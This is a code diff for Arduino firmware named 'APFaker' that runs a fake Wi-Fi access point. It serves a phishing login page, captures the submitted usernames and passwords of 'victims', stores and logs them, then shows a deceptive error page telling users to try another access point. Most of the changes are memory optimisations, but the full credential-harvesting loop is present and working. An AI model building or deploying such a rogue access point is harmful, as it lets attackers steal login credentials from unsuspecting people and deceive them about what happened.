@@ -8,11 +8,11 @@ class APFakerStruct
     char shortName[20];   // name displayed for reference
     char ssid[20];        // your network SSID (name)
     char pass[20];        // your network password (use for WPA, or use as key for WEP)
-    int keyIndex;         // your network key Index number (needed only for WEP)
+    uint8_t keyIndex;         // your network key Index number (needed only for WEP)
     bool operator!=(APFakerStruct comp){
       return strcmp(ssid, comp.ssid) != 0 || strcmp(pass, comp.pass) != 0 || (keyIndex != comp.keyIndex);
     }
-} currentAPFaker, emptyAPFaker = { "", "", "", -1 };
+} currentAPFaker, emptyAPFaker = { "", "", "", 0 };
 
 enum CODE_RETURN {
   CS_SUCCESS = 0,
@@ -22,7 +22,7 @@ enum CODE_RETURN {
 };
 
 int clientCount = 0;
-String connectedIP = "";
+String connectedIP = F("");
 
 enum METRICS {
   MTR_VICTIMS = 0,
@@ -35,7 +35,7 @@ enum METRICS {
  * In this array will be recorded the 
  * credentials leaves by the victims
  */
-String ResultList[1000];
+String ResultList[200];
 
 /**********************************
  * In this array will be recorded the 
@@ -44,7 +44,7 @@ String ResultList[1000];
  */
 int MetricsData[MTR_MAX_ELEM];
 
-int status = WL_IDLE_STATUS;
+uint8_t status = WL_IDLE_STATUS;
 WiFiServer server(80);
 
 IPAddress GetIPAddress() {
@@ -60,7 +60,7 @@ String IpAddressAsString(IPAddress ipAddress)
 }
 
 CODE_RETURN setupAPFaker() {
-  for(int i = 0; i < MTR_MAX_ELEM; i++)
+  for(uint8_t i = 0; i < MTR_MAX_ELEM; i++)
     MetricsData[i] = 0;
 
   // check for the WiFi module:
@@ -70,8 +70,7 @@ CODE_RETURN setupAPFaker() {
 
   currentAPFaker = emptyAPFaker;
 
-  String fv = WiFi.firmwareVersion();
-  if (fv < WIFI_FIRMWARE_LATEST_VERSION) {
+  if (WiFi.firmwareVersion() < WIFI_FIRMWARE_LATEST_VERSION) {
     return CS_WARNING_FIRMWARE_VERSION;
   }
 
@@ -90,15 +89,13 @@ CODE_RETURN InitializationAP(APFakerStruct apf) {
 
   currentAPFaker = apf;
 
-//  Serial.print("IP to navigate: ");
-//  Serial.println(GetIPAddress());
   Logger::WriteLog(LOG_INFO, "Initialization DONE. AP faker [" + String(apf.ssid) + "] available at Address IP [" + IpAddressAsString(GetIPAddress()) + "]!");
 
   return CS_SUCCESS;
 }
 
 void StopAP(){
-  Logger::WriteLog(LOG_INFO, "Stopping the AP faker!");
+  Logger::WriteLog(LOG_INFO, F("Stopping the AP faker!"));
   WiFi.end();
   currentAPFaker = emptyAPFaker;
 }
@@ -115,11 +112,11 @@ void CheckForNewDevices() {
       // a device has connected to the AP
       MetricsData[MTR_CLIENTS]++; // increment the current connected Device
       MetricsData[MTR_TOTAL]++; // increment the total connected Device
-      Logger::WriteLog(LOG_INFO, "Device connected to AP!");
+      Logger::WriteLog(LOG_INFO, F("Device connected to AP!"));
     } else {
       // a device has disconnected from the AP, and we are back in listening mode
       MetricsData[MTR_CLIENTS]--; // decrement the current connected Device
-      Logger::WriteLog(LOG_INFO, "Device disconnected from AP!");
+      Logger::WriteLog(LOG_INFO, F("Device disconnected from AP!"));
     }
   }
 }
@@ -127,37 +124,37 @@ void CheckForNewDevices() {
 void ProvideLogInPageToClient(WiFiClient client, String page){
   Logger::WriteLog(LOG_INFO, "Sending page " + page + " to " + IpAddressAsString(client.remoteIP()) + " started!");
   
-  client.println("HTTP/1.1 200 OK");
-  client.println("Content-type:text/html");
+  client.println(F("HTTP/1.1 200 OK"));
+  client.println(F("Content-type:text/html"));
   client.println();
   client.print(page);
-  client.print("<form method=\"POST\" action=\"/L\">");
-  client.print("<label for=\"uname\"><b>Username</b></label>");
-  client.print("<input type=\"text\" placeholder=\"Enter Username\" name=\"uname\" required><br />");
-  client.print("<label for=\"psw\"><b>Password</b></label>");
-  client.print("<input type=\"password\" placeholder=\"Enter Password\" name=\"psw\" required><br />");
-  client.print("<button type=\"submit\">Login</button><br />");
-  client.print("</form><br>");
-  client.print("Click <a href=\"/R\">here</a> to register<br>");
-  client.print("Click <a href=\"/F\">here</a> to recover password<br>");
+  client.print(F("<form method=\"POST\" action=\"/L\">"));
+  client.print(F("<label for=\"uname\"><b>Username</b></label>"));
+  client.print(F("<input type=\"text\" placeholder=\"Enter Username\" name=\"uname\" required><br />"));
+  client.print(F("<label for=\"psw\"><b>Password</b></label>"));
+  client.print(F("<input type=\"password\" placeholder=\"Enter Password\" name=\"psw\" required><br />"));
+  client.print(F("<button type=\"submit\">Login</button><br />"));
+  client.print(F("</form><br>"));
+  client.print(F("Click <a href=\"/R\">here</a> to register<br>"));
+  client.print(F("Click <a href=\"/F\">here</a> to recover password<br>"));
   client.println();
 
   Logger::WriteLog(LOG_INFO, "Sending page " + page + " completed!");
 }
 
 void ProvideErrorPageToClient(WiFiClient client, String message){
-  Logger::WriteLog(LOG_INFO, "Sending ERROR page started!");
+  Logger::WriteLog(LOG_INFO, F("Sending ERROR page started!"));
   
-  client.println("HTTP/1.1 200 OK");
-  client.println("Content-type:text/html");
+  client.println(F("HTTP/1.1 200 OK"));
+  client.println(F("Content-type:text/html"));
   client.println();
-  client.print("<div><h1>Webservice currently unavailable</h1>");
-  client.print("<p class=\"lead\">");
+  client.print(F("<div><h1>Webservice currently unavailable</h1>"));
+  client.print(F("<p class=\"lead\">"));
   client.print(message);
-  client.print("</p></div>");
+  client.print(F("</p></div>"));
   client.println();
 
-  Logger::WriteLog(LOG_INFO, "Sending ERROR page completed!");
+  Logger::WriteLog(LOG_INFO, F("Sending ERROR page completed!"));
 }
 
 /*
@@ -174,17 +171,18 @@ String GetRequest(WiFiClient client){
 }
  */
 
+String currentLine, credential;
+char c;
 void APFakerClientLoopManager(){
   WiFiClient client = server.available();   // listen for incoming clients
   if (client) {                             // if you get a client,
-    Logger::WriteLog(LOG_INFO, "New CLIENT!");
-    String currentLine = "";                // make a String to hold incoming data from the client
+    Logger::WriteLog(LOG_INFO, F("New CLIENT!"));
+    currentLine = F("");                // make a String to hold incoming data from the client
     while (client.connected()) {            // loop while the client's connected
       if (client.available()) {             // if there's bytes to read from the client,
-        char c = client.read();             // read a byte, then
+        c = client.read();                  // read a byte, then
         Serial.write(c);                    // print it out the serial monitor
         if (c == '\n') {                    // if the byte is a newline character
-          
           // if the current line is blank, you got two newline characters in a row.
           // that's the end of the client HTTP request, so send a response:
           if (currentLine.length() == 0) {
@@ -192,46 +190,47 @@ void APFakerClientLoopManager(){
             break;
           }
           else {      // if you got a newline, then clear currentLine:
-            currentLine = "";
+            currentLine = F("");
           }
         }
         else if (c != '\r') {    // if you got anything else but a carriage return character,
           currentLine += c;      // add it to the end of the currentLine
         }        
-        if (currentLine.endsWith("POST /L")) {
-          String credential = "";
+        if (currentLine.endsWith(F("POST /L"))) {
+          credential = F("");
           while ((c = client.read()) != 255)
           {
             if (c != '\n')
               credential += c;
             else
-              credential = "";
+              credential = F("");
             Serial.write(c);
           }
-          credential.replace("uname=", "");
-          credential.replace("&psw=", ":");
+          credential.replace(F("uname="), F(""));
+          credential.replace(F("&psw="), F(":"));
           ResultList[MetricsData[MTR_VICTIMS]] = credential;
           MetricsData[MTR_VICTIMS]++;
           RecordCredentials(credential);
           Logger::WriteLog(LOG_INFO, "New credential: [" + credential + "]!");
-          ProvideErrorPageToClient(client, "We're sorry there was a problem logging in.<br />Try again later or connect to another Access Point among those available.");
+          ProvideErrorPageToClient(client, F("We're sorry there was a problem logging in.<br />Try again later or connect to another Access Point among those available."));
           // Siamo spiacenti si è verificato un problema durante il login.<br />Riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.
           break;
         }
         if (currentLine.endsWith("GET /R")) {
-          ProvideErrorPageToClient(client, "We're sorry there was a problem.<br />The registration page is currently unavailable.<br />Please try again later or connect to another Access Point among those available.<br />We apologize for the inconvenience.");
+          ProvideErrorPageToClient(client, F("We're sorry there was a problem.<br />The registration page is currently unavailable.<br />Please try again later or connect to another Access Point among those available.<br />We apologize for the inconvenience."));
           // Siamo spiacenti si è verificato un problema.<br />La pagina di registrazione non è al momento disponibile.<br />Siete pregati di riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.<br />Ci scusiamo per il disservizio.
           break;
         }
         if (currentLine.endsWith("GET /F")) {
-          ProvideErrorPageToClient(client, "We're sorry there was a problem.<br />The credentials recovery page is currently unavailable.<br />Please try again later or connect to another Access Point among those available.<br />We apologize for the inconvenience.");
+          ProvideErrorPageToClient(client, F("We're sorry there was a problem.<br />The credentials recovery page is currently unavailable.<br />Please try again later or connect to another Access Point among those available.<br />We apologize for the inconvenience."));
           // Siamo spiacenti si è verificato un problema.<br />La pagina del recupero delle credenziali non è al momento disponibile.<br />Siete pregati di riprovare più tardi o connettersi a un altro Access Point tra quelli disponibili.<br />Ci scusiamo per il disservizio.
           break;
         }
       }
     }
+    Logger::WriteLog(LOG_INFO, F("disconnecting CLIENT!"));
     // close the connection:
     client.stop();
-    Logger::WriteLog(LOG_INFO, "CLIENT disconnected!");
+    Logger::WriteLog(LOG_INFO, F("CLIENT disconnected!"));
   }
 }
